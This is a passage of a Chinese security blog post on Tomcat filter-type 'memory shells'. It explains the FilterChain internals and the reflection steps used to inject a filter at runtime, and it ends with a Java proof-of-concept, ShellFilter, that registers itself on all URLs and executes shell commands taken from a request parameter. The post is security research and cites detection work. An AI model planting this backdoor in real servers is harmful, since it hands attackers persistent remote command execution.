+src="/img/Java内存马原理（一）/image-20230808163741065.png" /></p>
+<p>拿到所有的Filters后，分两种情况对其进行添加：</p>
+<ul>
+<li>若Filter的URL和当前请求的路径一致，则获取<code>ApplicationFilterConfig</code>并将这个filter添加到filterChain中。</li>
+</ul>
+<p><img
+src="/img/Java内存马原理（一）/image-20230808163936530.png" /></p>
+<p><img
+src="/img/Java内存马原理（一）/image-20230808164131800.png" /></p>
+<ul>
+<li>第二类情况，若这个Filter有设置<code>ServletName</code>，则和当前访问的Servlet的名字一样，那么就添加到filterChain中：</li>
+</ul>
+<p><img
+src="/img/Java内存马原理（一）/image-20230808153725038.png" /></p>
+<p><img
+src="/img/Java内存马原理（一）/image-20230808153637505.png" /></p>
+<p>可以在注解中使用<code>servletNames</code>来使一个filter可以对应多个Servlet：</p>
+<p><img
+src="/img/Java内存马原理（一）/image-20230808153830704.png" /></p>
+<p>最终，<strong>所有容器中的Filters都处理完后，返回filterChain</strong>：</p>
+<p><img
+src="/img/Java内存马原理（一）/image-20230808153759548.png" /></p>
+<p>我们可以总结出Tomcat注册一个Filter并执行其逻辑的流程：</p>
+<ul>
+<li>利用ApplicationFIlterFactory工厂类创建一个FilterChain
+<ul>
+<li>获取容器中所有的FilterMaps</li>
+<li>遍历每一个FilterMap，判断是否与当前访问的URL模式匹配，是则添加到当前请求处理的FilterChain中</li>
+<li>返回FilterChain</li>
+</ul></li>
+<li>遍历FilterChain，取出FilerConfig中、FilterDef中的Filter，并调用其doFilter方法。</li>
+</ul>
+<p><strong>特点：每次客户端请求到达时，都会构造一个新的FilterChain对象并载入各个匹配的过滤器。</strong></p>
+<h2 id="利用方法">利用方法</h2>
+<p>根据上面的流程，思路很清晰，就是注册一个包含恶意代码的Filter到上述的<code>ApplicationFilterChain</code>中。</p>
+<p>直观上，我们可以依靠<code>ApplicationContextFacade</code>的<code>addFilter</code>方法，<strong>但是只靠他是不够的</strong>。</p>
+<p>我们先需要简单看看这部分的代码，了解<strong>注册一个Filter的条件是什么</strong>。</p>
+<p>该方法由<code>ServletContext</code>接口定义，并有三个重载： <img
+src="/img/Java内存马原理（一）/image-20230808144014116.png" /></p>
+<p>三个方法第一个参数都是Filter的名称，第二个参数可以指定类名、第三个可以指定一个Filter接口的子类。因为是Facade外观模式，所以实际上他们三个本质上都是调用了<code>ApplicationContext</code>对应的addFilter方法：
+<img src="/img/Java内存马原理（一）/image-20230808144820744.png" /></p>
+<p>其中前三个重载都会调用第四个，所以我们直接看第四个就可以了：</p>
+<figure>
+<img src="/img/Java内存马原理（一）/image-20230808165211119.png"
+alt="image-20230808165211119" />
+<figcaption aria-hidden="true">image-20230808165211119</figcaption>
+</figure>
+<p>其中<code>checkState</code>函数如下：</p>
+<p><img
+src="/img/Java内存马原理（一）/image-20230808165247974.png" /></p>
+<p>小结一下，这里存在两个困难点：</p>
+<ol type="1">
+<li><code>checkState</code>函数表明，当前容器状态必须为<strong>STARTING_PREP（准备启动状态）</strong>，所以我们无法在Tomcat<strong>STARTED（已启动）</strong>的运行时状态下直接利用。</li>
+<li>这里只是将一个<code>FilterDef</code>添加到了容器中，从上一小节的流程来看，单纯只是在容器中多了一个定义是没有用的，讲道理需要把它包装到<code>FilterConfig</code>中并调用<code>FilterChain</code>对象的<code>addFilter</code>方法才能添加。</li>
+</ol>
+<p>那怎么办？</p>
+<p>对于问题1，我们可以利用反射获取到生命状态并进行修改。对于问题2，我们需要利用如下途径来解决：</p>
+<p>在<code>StandardContext</code>中有一个方法<code>filterStart</code>：</p>
+<p><img
+src="/img/Java内存马原理（一）/image-20230808160304824.png" /></p>
+<p>该方法遍历所有的filter定义，并和其名称一起放入filterConfigs这个HashMap中。在这里，<strong>filterDef得到了包装</strong>。</p>
+<p>该方法在Tomcat启动时就被调用了，调用链如下：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">filterStart:4302, StandardContext (org.apache.catalina.core)</span><br><span class="line">startInternal:4922, StandardContext (org.apache.catalina.core)</span><br><span class="line">start:183, LifecycleBase (org.apache.catalina.util)</span><br><span class="line">addChildInternal:683, ContainerBase (org.apache.catalina.core)</span><br><span class="line">addChild:658, ContainerBase (org.apache.catalina.core)</span><br><span class="line">addChild:713, StandardHost (org.apache.catalina.core)</span><br><span class="line">manageApp:1821, HostConfig (org.apache.catalina.startup)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (jdk.internal.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (jdk.internal.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (jdk.internal.reflect)</span><br><span class="line">invoke:566, Method (java.lang.reflect)</span><br><span class="line">invoke:294, BaseModelMBean (org.apache.tomcat.util.modeler)</span><br><span class="line">invoke:809, DefaultMBeanServerInterceptor (com.sun.jmx.interceptor)</span><br><span class="line">invoke:801, JmxMBeanServer (com.sun.jmx.mbeanserver)</span><br><span class="line">createStandardContext:428, MBeanFactory (org.apache.catalina.mbeans)</span><br><span class="line">createStandardContext:376, MBeanFactory (org.apache.catalina.mbeans)</span><br><span class="line">... 省略 ...</span><br><span class="line">runWorker:1128, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:628, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:834, Thread (java.lang)</span><br></pre></td></tr></table></figure>
+<p>到这里还没有结束，我们还需要为这个Filter绑定URL，因为对方显然不会再web.xml里写我们的filter，我们给自己的恶意filter带上<code>@WebFilter</code>注解也没用（没有初始化）。因此，我们需要利用<code>ApplicationFilterRegistration</code>的<code>addMappingForUrlPatterns</code>方法：</p>
+<p><img
+src="/img/Java内存马原理（一）/image-20230808162634878.png" /></p>
+<p>因此，我们可以初步总结出思路了：</p>
+<ul>
+<li>反射修改Tomcat运行状态为<code>LifecycleState.STARTING_PREP</code>状态。</li>
+<li>通过<code>ApplicationContextFacade.addFilter</code>方法，添加我们的<code>FilterDef</code>到容器中。</li>
+<li>调用<code>ApplicationFilterRegistration.addMappingForUrlPatterns</code>方法添加URL匹配模式。</li>
+<li>修改回来Tomcat运行状态为<code>LifecycleState.STARTED</code>。</li>
+<li>调用<code>StandardContext.filterStart</code>方法将我们的<code>FilterDef</code>包装成为<code>ApplicationFilterConfig</code>并放入容器中。</li>
+</ul>
+<p>最后要考虑的问题就是如何拿到<code>ApplicationContextFacade</code>，我们可以通过客户端请求<code>ServletRequest</code>中获取。具体来说，在<code>ApplicationFilterChain</code>中有两个threadlocal类：</p>
+<p><img
+src="/img/Java内存马原理（一）/image-20230809090920182.png" /></p>
+<p>默认情况下是不会初始化的：</p>
+<p><img
+src="/img/Java内存马原理（一）/image-20230809091006692.png" /></p>
+<p>而若我们通过反射将这个属性设置为true的话，那就可以拿到客户端请求对象了，从而获取到上下文。所以最终的思路总结如下：</p>
+<ul>
+<li>反射获取到<code>ApplicationFilterChain</code>的<code>dispatcherWrapsSameObject</code>属性并修改为true。</li>
+<li>反射获取到客户端请求对象。</li>
+<li>反射获取到<code>StandardContext</code>容器。</li>
+<li>反射修改Tomcat运行状态为<code>LifecycleState.STARTING_PREP</code>状态。</li>
+<li>通过<code>ApplicationContextFacade.addFilter</code>方法，添加我们的<code>FilterDef</code>到容器中。</li>
+<li>调用<code>ApplicationFilterRegistration.addMappingForUrlPatterns</code>方法添加URL匹配模式。</li>
+<li>修改回来Tomcat运行状态为<code>LifecycleState.STARTED</code>。</li>
+<li>调用<code>StandardContext.filterStart</code>方法将我们的<code>FilterDef</code>包装成为<code>ApplicationFilterConfig</code>并放入容器中。</li>
+</ul>
+<h2 id="利用代码">利用代码</h2>
+<p>根据上面的利用思路，我们可以基于Java的反射机制来实现一个恶意的Filter类，达到注册恶意后门路径并提供webshell的目的，且由于该webshell活动于tomcat内存中，也区别于基于文件的传统一句话webshell。</p>
+<p>下面是一个没有回显的poc，可以了解原理，暂时还没有在本地环境中实验。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> f10at.webshell.web.payload;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Tomcat filter型内存马</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@email</span> float311@163.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2023/8/8</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShellFilter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 设置ApplicationFilterChain的dispatcherWrapsSameObject属性为true从而获取到两个ThreadLocal变量</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">dispatcherWrapSameObjectField</span> <span class="operator">=</span></span><br><span class="line">                    org.apache.catalina.core.ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;dispatcherWrapsSameObject&quot;</span>);</span><br><span class="line">            dispatcherWrapSameObjectField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            dispatcherWrapSameObjectField.set(Boolean.class, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取请求对象以获取到上下文</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">requestObject</span> <span class="operator">=</span></span><br><span class="line">                    org.apache.catalina.core.ApplicationFilterChain.class.getDeclaredField(<span class="string">&quot;lastServicedRequest&quot;</span>);</span><br><span class="line">            requestObject.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">// 静态属性参数可以为null直接获取</span></span><br><span class="line">            ThreadLocal&lt;ServletRequest&gt; t = (ThreadLocal&lt;ServletRequest&gt;) requestObject.get(<span class="literal">null</span>);</span><br><span class="line">            <span class="comment">// 获取ApplicationContext</span></span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> t.get().getServletContext();</span><br><span class="line">            <span class="comment">// 获取StandardContext</span></span><br><span class="line">            StandardContext standardContext;</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">contextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">                contextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> contextField.get(servletContext);</span><br><span class="line">                <span class="keyword">if</span> (o <span class="keyword">instanceof</span> jakarta.servlet.ServletContext) &#123;</span><br><span class="line">                    servletContext = (jakarta.servlet.ServletContext) o;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (o <span class="keyword">instanceof</span> org.apache.catalina.core.StandardContext) &#123;</span><br><span class="line">                    standardContext = (org.apache.catalina.core.StandardContext) o;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 修改Tomcat运行时状态</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">stateField</span> <span class="operator">=</span> org.apache.catalina.util.LifecycleBase.class.getDeclaredField(<span class="string">&quot;state&quot;</span>);</span><br><span class="line">            stateField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            stateField.set(org.apache.catalina.LifecycleState.class,</span><br><span class="line">                    org.apache.catalina.LifecycleState.STARTING_PREP);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 新建一个Filter马</span></span><br><span class="line">            <span class="type">Filter</span> <span class="variable">shellFilter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShellFilter</span>();</span><br><span class="line">            <span class="comment">// 通过addFilter函数生成FilterDef</span></span><br><span class="line">            FilterRegistration.<span class="type">Dynamic</span> <span class="variable">registration</span> <span class="operator">=</span> servletContext.addFilter(<span class="string">&quot;f10at&quot;</span>, shellFilter);</span><br><span class="line">            registration.setInitParameter(<span class="string">&quot;encoding&quot;</span>, <span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">            <span class="comment">// 添加URL匹配规则</span></span><br><span class="line">            registration.addMappingForUrlPatterns(java.util.EnumSet.of(DispatcherType.REQUEST), <span class="literal">false</span>, <span class="string">&quot;/*&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 恢复Tomcat运行时状态</span></span><br><span class="line">            stateField.set(org.apache.catalina.LifecycleState.class,</span><br><span class="line">                    org.apache.catalina.LifecycleState.STARTED);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 利用filterStart方法将FilterDef放入容器中</span></span><br><span class="line">            <span class="type">Method</span> <span class="variable">filterStartMethod</span> <span class="operator">=</span> org.apache.catalina.core.StandardContext.class.getMethod(<span class="string">&quot;filterStart&quot;</span>);</span><br><span class="line">            filterStartMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            filterStartMethod.invoke(standardContext);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将filter插入到filterChain的第一个位置</span></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.err.println(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        String cmd;</span><br><span class="line">        <span class="comment">// 执行命令</span></span><br><span class="line">        <span class="keyword">if</span> ((cmd = request.getParameter(<span class="string">&quot;f10at&quot;</span>)) != <span class="literal">null</span>) &#123;</span><br><span class="line">            Runtime.getRuntime().exec(cmd);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 执行其他filter</span></span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="参考">参考</h1>
+<p><a target="_blank" rel="noopener" href="https://javasec.org/javaweb/MemoryShell/">JavaWeb 内存马基础
+· 攻击Java Web应用-Java Web安全</a></p>
+<p><a
+target="_blank" rel="noopener" href="https://gv7.me/articles/2020/kill-java-web-filter-memshell/">查杀Java
+web filter型内存马 | 回忆飘如雪 (gv7.me)</a></p>
+<p><a
+target="_blank" rel="noopener" href="https://gv7.me/articles/2020/filter-servlet-type-memshell-scan-capture-and-kill/">Filter/Servlet型内存马的扫描抓捕与查杀
+| 回忆飘如雪 (gv7.me)</a></p>
+
+    </article>
+    <!-- license -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://lzwgiter.github.io">lzwgiter</a>
+            <p>原文链接：<a href="https://lzwgiter.github.io/posts/c16d1cd9.html">https://lzwgiter.github.io/posts/c16d1cd9.html</a>
+            <p>发表日期：<a href="https://lzwgiter.github.io/posts/c16d1cd9.html">August 8th 2023, 4:05:17 pm</a>
+            <p>更新日期：<a href="https://lzwgiter.github.io/posts/c16d1cd9.html">August 9th 2023, 9:42:44 am</a>
+            <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/posts/e2947908.html" title="Java Instrument机制及管窥IAST">
+                    <div class="prevTitle">Java Instrument机制及管窥IAST</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- comment -->
+    
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+
+            
+
+            
+
+            
+
+            <!-- utteranc评论 -->
+
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+
+            
+            
+    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+    <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+    <div id="comment"></div>
+    <script>
+        new Valine({
+            el: '#comment',
+            notify:false,
+            verify:false,
+            appId: "KADRlHg5xXyhKL0d6USDWfIB-gzGzoHsz",
+            appKey: "Ppj8kIdro2yDqXOvqWkTRxuW",
+            placeholder: "递茶就坐(　o=^•ェ•)o　┏━┓",
+            path:window.location.pathname,
+            avatar:'mm'
+        });
+    </script>
+
+
+            
+
+        </div>
+    
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    
+    <!-- Mathjax -->
+    
+</main>
+
+                <!-- profile -->
+                
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+        <div class="social">
+            
+    
+        
+            
+                <a href="mailto:float311@163.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/lzwgiter" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                    
+                    <img class="profile-qr" src="/assets/wechat.png" />
+                </span>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer qq" title=qq>
+                    
+                    <img class="profile-qr" src="/assets/qq.png" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
+            
+        
+    
+
+
+        </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    
+    <!-- 不蒜子  -->
+    
+        <div class="busuanzi-container">
+            
+            
+                <span id="busuanzi_container_site_uv">做客的小伙伴数: <span id="busuanzi_value_site_uv"></span></span>
+            
+        </div>
+    	
+</footer>
+
+        </div>
+        <!-- toc -->
+        
+            <div class="toc-wrapper toc-wrapper-loding" style=
+
+
+
+
+
+
+
+    top:50vh;
+
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%97%A0%E6%96%87%E4%BB%B6webshell"><span class="toc-number">1.</span> <span class="toc-text">什么是无文件webshell？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%B3%E4%BA%8Eservlet"><span class="toc-number">2.</span> <span class="toc-text">关于Servlet</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8Efilter"><span class="toc-number">3.</span> <span class="toc-text">基于Filter</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#filterchain%E6%B3%A8%E5%86%8C%E8%BF%87%E7%A8%8B"><span class="toc-number">3.1.</span> <span class="toc-text">FilterChain注册过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">3.2.</span> <span class="toc-text">利用方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E4%BB%A3%E7%A0%81"><span class="toc-number">3.3.</span> <span class="toc-text">利用代码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">4.</span> <span class="toc-text">参考</span></a></li></ol>
+            </div>
+        
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
